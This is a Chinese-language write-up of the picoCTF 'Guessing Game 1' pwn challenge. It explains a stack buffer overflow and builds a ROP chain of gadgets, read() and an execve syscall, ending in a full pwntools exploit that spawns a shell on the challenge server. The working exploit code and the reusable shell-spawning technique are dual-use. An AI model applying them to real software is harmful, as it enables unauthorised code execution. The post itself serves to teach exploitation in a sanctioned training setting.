---
layout: post
title: picoCTF - Guessing Game 1 (ROP Chain)
slug: picoCTF - Guessing Game 1 (ROP Chain)
category: PWN
published: true
---

[Guessing Game 1](https://play.picoctf.org/practice/challenge/90?category=6&page=1)

这题主要涉及到的是ROP chain的使用，由于没做过这类题所以还是学到不少东西，在这里输出一下。

## Code Review

题目有三个文件，分别是源码、执行文件和Makefile，可以看到Makefile里的编译指令开启了这些选项`-fno-stack-protector -O0 -no-pie -static`，分别是关闭栈保护，无优化，代码位置不会改变，且没有动态库，libc都被静态链接进来了。（**调试时候使用题目发的二进制，不要自己编译，因为最后需要nc到服务器上执行，代码地址可能会有变动（嗨，在这吃了亏）**）

```bash
clot@ubuntu:~/CTF/GuessGame1$ ./vuln
Welcome to my guessing game!

What number would you like to guess?
84
Congrats! You win! Your prize is this print statement!

New winner!
Name? Jin
Congrats Jin


What number would you like to guess?
```

通过执行程序和读源码 vuln.c，理解了大致流程：

 1. 猜一个随机数+1后的结果
 2. 正确则会要求输入名字
 3. 继续猜数字

并发现可利用漏洞位置：

```c
#define BUFSIZE 100

void win() {
 char winner[BUFSIZE];
 printf("New winner!\nName? ");
 fgets(winner, 360, stdin);
 printf("Congrats %s\n\n", winner);
}
```

这里的`BUFSIZE`是100，所以栈上只留了100的空间，然而`fgets`可以读取360个字符，这就可以导致栈溢出，修改return地址了。

整个程序中没有打印flag的地方，也没有执行`system('/bin/sh')`的地方，需要我们自己拼凑`ROPGadget`构建。

### 注意，这个程序是开启了`NXEnable`的，所以栈上的内容是不可执行的，也就说shellcode的方法不能用了

```bash
[*] '/home/clot/CTF/GuessGame1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

### 主要步骤如下

1. 解决伪随机数
2. 确认字符串长度及覆盖地址
3. 查找到对应的gadget
4. 构建`syscall` `execve`函数及参数(因为找不到`system`函数调用)

伪随机数的问题很好解决，猜对后输入名字，长度足够覆盖到ret地址。通过在运行时观察栈的布局，可以看到ret地址(0x0000000000400d01)在120个字符串之后。(0x7fffffffde28 - 0x7fffffffddb0 = 120)

```bash
pwndbg> x/40gx $rsp - 0x70
0x7fffffffdda0: 0x0000000000401a80 0x0000000000400c71
0x7fffffffddb0: 0x4141414141414141 0x000000000049000a
0x7fffffffddc0: 0x00000000006bc0a0 0x00000000006ba018
0x7fffffffddd0: 0x0000000000000000 0x00000000004163b3
0x7fffffffdde0: 0x000000000000001d 0x00000000006ba360
0x7fffffffddf0: 0x00000000004930e8 0x00000000004112c2
0x7fffffffde00: 0x00007fffffffdf88 0x0000000000000054
0x7fffffffde10: 0x0000000000000054 0x0000000100401a80
0x7fffffffde20: 0x00007fffffffde50 0x0000000000400d01
0x7fffffffde30: 0x00007fffffffdf78 0x0000000100401a80
```

接下来我们要调用`syscall`，其参数和函数地址都通过`ROPGadget`来获得。我将gadget全部导入了一个文件中。

```sh
$ROPGadget --binary vuln > gadget
```

`syscall`的参数：

 1. `execve`调用号:59 （存放到RAX)

 2. `execve`的参数: `/bin/sh, 0, 0`

所以我们需要的寄存器分别是：

```text
RAX: 59  
RDI: 字符串'/bin/sh'的地址  
RSI: 0  
RDX: 0
```

这样，我们要从gadget中找的东西就明了了:

```text
0x00000000004163f4 : pop rax ; ret
0x0000000000400696 : pop rdi ; ret
0x0000000000410ca3 : pop rsi ; ret
0x000000000044a6b5 : pop rdx ; ret
0x000000000040137c : syscall
```

问题来了，找不到`/bin/sh`这个字符串。这玩意也要我们自己来构建了。
我们能够用的办法就是调用类似`fgets`从stdin读取输入的函数，来获取`/bin/sh`。

`fgets`函数是找到了，结果这个函数地址是`0x4010a10`。这里面有一个**0a**。如果字符串中包含这个字符，传给`fgets`后是会被截断的。尝试骗过输入后改地址失败后，换用`read`函数了。。

`read`地址为：0x44a6a0，没有会被中断的符号。函数需要三个参数，分别是:

```text
rdi: stdin
rsi: &buff
rdx: length
```

这里的buff存放地址需要自己找一个进程中可读可写的地方，在调试时可以通过`vmmap`来查看：

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x4b7000 r-xp    b7000 0      /home/clot/CTF/GuessGame1/vuln
          0x6b7000           0x6bd000 rw-p     6000 b7000  /home/clot/CTF/GuessGame1/vuln
          0x6bd000           0x6e1000 rw-p    24000 0      [heap]
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000 0      [vvar]
    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000 0      [vdso]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

可以看到`0x6b7000 ~ 0x6bd000`可读可写，从中选了一个位置`0x6bc500`。

## Exploit

基本条件都已经满足了，可以写Exploit了。

### ERROR

运行后会发现报错：**got eof while reading in interactive**，google了下发现可能是某些关键的寄存器被改成不合法的了，调试了下发现，`rbp`的值被改成了120个A的最后8个改成了`41414141414141..`，那么再找一个可读可写相对安全的地址给它 `0x6ba500`，用112个A和这个地址拼凑成120个字符。

完整的exploit:

```python
from pwn import *

host = 'jupiter.challenges.picoctf.org'
port = '50581'
p = remote(host, port)

# Local
#elf = ELF('./vuln')
#p = elf.process()
#gdb.attach(p)

p.recv(1024)
p.sendline('84')
p.recv(1024)

newRBP = 0x6ba500

payload = b'A'*112 + p64(newRBP)
popRAX = 0x4163f4
popRDI = 0x400696
popRSI = 0x410ca3
popRDX = 0x44a6b5
syscall = 0x40137c

read = 0x44a6a0
stdin = 0x6ba580
buff = 0x6bc500

# get string '/bin/sh'
payload += p64(popRDI)
payload += p64(0)
payload += p64(popRSI)
payload += p64(buff)
payload += p64(popRDX)
payload += p64(7)
payload += p64(read)

# syscall - execve('/bin/sh', 0, 0)
payload += p64(popRAX)
payload += p64(59)
payload += p64(popRDI)
payload += p64(buff)
payload += p64(popRSI)
payload += p64(0)
payload += p64(popRDX)
payload += p64(0)
payload += p64(syscall)

p.sendline(payload)
binSh = b'/bin/sh'
p.sendline(binSh)
p.interactive()
```

运行并成功获取到flag：

```bash
clot@ubuntu:~/CTF/GuessGame1$ python3 vuln_expolit.py
[+] Opening connection to jupiter.challenges.picoctf.org on port 50581: Done
[*] Switching to interactive mode
Congrats! You win! Your prize is this print statement!

New winner!
Name? Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
```
